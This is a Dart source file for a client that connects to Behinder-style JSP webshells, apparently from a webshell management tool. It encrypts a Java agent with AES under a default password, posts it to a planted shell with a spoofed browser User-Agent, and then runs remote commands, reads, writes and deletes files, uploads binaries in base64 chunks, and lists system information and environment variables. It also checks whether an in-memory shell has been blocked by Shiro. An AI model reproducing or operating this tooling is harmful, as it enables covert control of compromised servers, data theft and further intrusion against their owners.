import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:math' as math;
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import 'package:crypto/crypto.dart' as crypto;

import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';

/// `jsp_behinder.jsp` / `bing.jsp`：冰蝎 3.0 协议，AES 加密传输
///
/// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
/// POST body 两行：第 1 行 base64(AES_encrypt(M.class))，第 2 行 a=exec&_k=xxx&xxx=cmd
/// bing.jsp 兼容：payload 只读第一行，agent 用 getReader().readLine() 读第二行解析参数
class JspBehinderConnector extends ShellConnector {
  JspBehinderConnector(super.webshell);

  late final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};
  late final String _execKey = _randomHex32();

  static String _randomHex32() {
    final rng = math.Random.secure();
    return List.generate(32, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  /// 冰蝎密钥：支持两种格式
  /// 1. 16 位十六进制（如 e45e329feb5d925b）→ 直接作为密钥，用于匹配 payload 中的 String k="xxx"
  /// 2. 其他 → 视为连接密码，密钥 = MD5(password)[0:16]
  String get _aesKey {
    final pass = webshell.password?.trim().isNotEmpty == true
        ? webshell.password!.trim()
        : 'mAtrix_911';
    if (pass.length == 16 && _isHex16(pass)) {
      return pass.toLowerCase();
    }
    final md5 = crypto.md5.convert(utf8.encode(pass)).toString();
    return md5.substring(0, 16);
  }

  static bool _isHex16(String s) {
    if (s.length != 16) return false;
    for (var i = 0; i < 16; i++) {
      final c = s.codeUnitAt(i);
      if (!((c >= 0x30 && c <= 0x39) ||
          (c >= 0x61 && c <= 0x66) ||
          (c >= 0x41 && c <= 0x46))) {
        return false;
      }
    }
    return true;
  }

  static bool _isHex32(String s) {
    if (s.length != 32) return false;
    for (var i = 0; i < 32; i++) {
      final c = s.codeUnitAt(i);
      if (!((c >= 0x30 && c <= 0x39) ||
          (c >= 0x61 && c <= 0x66) ||
          (c >= 0x41 && c <= 0x46))) {
        return false;
      }
    }
    return true;
  }

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  Future<Uint8List> _getAgentBytes() async {
    String b64;
    try {
      b64 = (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
    } catch (_) {
      try {
        final file = io.File('data/jsp_agent_M.b64');
        b64 = await file.exists() ? (await file.readAsString()).trim() : '';
      } catch (_) {
        b64 = '';
      }
    }
    if (b64.isEmpty) return Uint8List(0);
    return Uint8List.fromList(base64.decode(b64));
  }

  void _updateCookies(http.Response response) {
    final raw = response.headers['set-cookie'];
    if (raw == null) return;
    final part = raw.split(';').first.trim();
    final eq = part.indexOf('=');
    if (eq > 0)
      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
  }

  Map<String, String> _requestHeaders(
    String action,
    Map<String, String> extraParams,
  ) {
    final h = <String, String>{
      'Content-Type': 'application/octet-stream',
      'X-A': action,
    };
    if (_cookies.isNotEmpty) {
      h['Cookie'] = _cookies.entries
          .map((e) => '${e.key}=${e.value}')
          .join('; ');
    }
    for (final e in extraParams.entries) {
      if (e.key == '_k') {
        h['X-K'] = e.value;
      } else if (e.key == 'path') {
        h['X-Path'] = e.value;
      } else if (e.key == 'data') {
        h['X-Data'] = e.value;
      } else if (e.key.length == 32 && _isHex32(e.key)) {
        h['X-V'] = e.value;
      }
    }
    return h;
  }

  String _aesEncryptBase64(Uint8List plain) {
    final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
    final encrypted = encrypter.encryptBytes(plain);
    return base64.encode(encrypted.bytes);
  }

  bool _sessionEstablished = false;
  String? _lastPingDiagnostic;

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  /// 首次请求前 GET 建立 session（部分 Tomcat/JBoss 需要）
  Future<void> _ensureSession() async {
    if (_sessionEstablished) return;
    try {
      final uri = Uri.parse(webshell.url);
      final r = await _client.get(uri).timeout(const Duration(seconds: 5));
      _updateCookies(r);
      _sessionEstablished = true;
    } catch (_) {
      // GET 失败不阻断，POST 仍可尝试
      _sessionEstablished = true;
    }
  }

  Future<String> _sendBehinder(
    String action, {
    Map<String, String> extraParams = const {},
  }) async {
    try {
      await _ensureSession();

      final agentBytes = await _getAgentBytes();
      if (agentBytes.isEmpty) return '[Error] jsp_agent_M.b64 未找到';

      // 发送纯净单行 Base64 载荷，不带换行符，防止 readLine() 意外截断
      final b64Payload = _aesEncryptBase64(
        agentBytes,
      ).replaceAll('\n', '').replaceAll('\r', '');
      final bodyBytes = utf8.encode(b64Payload);

      final uri = Uri.parse(webshell.url);
      final headers = _requestHeaders(action, extraParams);
      // 增加触发 Header 兼容性
      headers['Accept'] = '*/*';
      headers['User-Agent'] =
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';

      final response = await _client
          .post(uri, headers: headers, body: bodyBytes)
          .timeout(const Duration(seconds: 15));

      _updateCookies(response);
      if (response.statusCode == 200) {
        final body = decodeWithFallback(response.bodyBytes);
        // 如果响应包含典型的 Shiro 登录特征，说明内存马未生效
        if (body.contains('rememberMe=deleteMe') ||
            response.headers['set-cookie']?.contains('rememberMe=deleteMe') ==
                true) {
          return '[Error] 内存马未响应 (被 Shiro 重定向/拦截)';
        }
        return body;
      }

      if (response.statusCode == 302 || response.statusCode == 301) {
        final location = response.headers['location'] ?? 'unknown';
        return '[HTTP ${response.statusCode}] 发生重定向 -> $location\n这通常意味着内存马未生效，请求被拦截到了登录页面。';
      }

      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 4096
          ? '${body.substring(0, 4096)}...'
          : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // ── ShellConnector 实现 ────────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final r = await _sendBehinder('ping').timeout(const Duration(seconds: 8));
      _lastPingDiagnostic = r.contains('MATRIX_JSP_PING') ? null : r;
      return r.contains('MATRIX_JSP_PING');
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
        ? 'cd ${_sq(workingDir)} && '
        : '';
    final r = await _sendBehinder(
      'exec',
      extraParams: {'_k': _execKey, _execKey: '$cd$cmd'},
    );
    return r.trim();
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendBehinder('pwd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final result = await _sendBehinder('ls', extraParams: {'path': path});
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }

    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<String> readFile(String path) async =>
      _sendBehinder('cat', extraParams: {'path': path});

  @override
  Future<bool> writeFile(String path, String content) async {
    final r = await _sendBehinder(
      'write',
      extraParams: {'path': path, 'data': base64.encode(utf8.encode(content))},
    );
    return r.trim() == '1';
  }

  @override
  Future<bool> deleteFile(String path) async {
    final r = await _sendBehinder('rm', extraParams: {'path': path});
    return r.trim() == '1';
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    // 通过 shell base64 命令编码，避免二进制数据经 PrintWriter 损坏
    final cmd =
        'cat ${_sq(path)} 2>/dev/null | base64 -w0 2>/dev/null'
        " || cat ${_sq(path)} 2>/dev/null | base64";
    final result = await _sendBehinder(
      'exec',
      extraParams: {'_k': _execKey, _execKey: cmd},
    );
    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
    if (b64.isEmpty || b64.startsWith('[')) {
      throw Exception('无法读取文件: $b64');
    }
    return base64.decode(b64);
  }

  /// 上传场景下的实际写入路径：
  /// 现在统一直接使用调用方传入的路径（即当前浏览目录下的目标路径），
  /// 不再强制落到 /tmp。
  static String _uploadPathFor(String path) {
    return path;
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    return writeFileBinaryWithProgress(path, bytes, (_, _) {});
  }

  // 分块大小：4 KB → base64 后约 5.5 KB，安全低于 Tomcat 默认 maxHttpHeaderSize (8 KB)
  static const _kChunkSize = 4 * 1024;

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    final target = _uploadPathFor(path);
    onProgress(0, total);

    int offset = 0;
    bool first = true;
    while (offset < total) {
      final end = (offset + _kChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      final redirect = first ? '>' : '>>';
      final cmd =
          "echo ${_sq(b64)} | base64 -d $redirect ${_sq(target)} && echo 1 || echo 0";
      final r = await _sendBehinder(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      if (!r.trim().endsWith('1')) return false;
      offset = end;
      first = false;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final result = await _sendBehinder('sysinfo');
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = decodeWithFallback(
            base64.decode(line.substring(0, idx).trim()),
          );
          final val = decodeWithFallback(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final result = await _sendBehinder('ls', extraParams: {'path': path});
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async => (await _sendBehinder('home')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendBehinder('envnames');
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
